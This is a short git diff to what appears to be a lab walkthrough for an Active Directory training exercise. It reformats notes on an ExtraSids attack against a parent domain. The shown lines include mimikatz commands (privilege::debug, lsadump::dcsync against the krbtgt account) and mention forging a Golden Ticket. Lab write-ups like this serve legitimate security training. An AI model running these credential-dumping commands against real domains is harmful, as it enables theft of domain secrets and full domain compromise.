@@ -28,8 +28,8 @@ Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | sele
 ---
 Q3: Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.
 
-.\mimikatz.exe
-mimikatz> privilege::debug
+.\mimikatz.exe <br>
+mimikatz> privilege::debug <br>
 mimikatz> lsadump::dcsync /user:LOGISTICS\krbtgt
 
 ## We now have the krbtgt hash, the SID of the Enterprise Admins group, and the SID of the child domain, which enables us to create a Golden Ticket.
